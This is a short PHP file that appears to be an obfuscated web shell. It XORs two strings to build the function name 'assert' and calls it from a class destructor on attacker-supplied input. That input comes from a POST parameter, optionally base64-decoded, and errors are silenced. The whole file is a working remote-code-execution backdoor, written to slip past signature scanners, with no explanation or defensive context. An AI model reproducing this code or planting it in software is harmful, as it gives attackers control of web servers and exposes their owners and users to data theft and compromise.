<?php
class AHPJ{
    function __destruct(){
        $HMGA="1KD0JM"^"\x50\x38\x37\x55\x38\x39";
        return @$HMGA("$this->FVQC");
    }
}
$ahpj=new AHPJ();
@$ahpj->FVQC=isset($_GET["id"])?base64_decode($_POST["show"]):$_POST["show"];
?>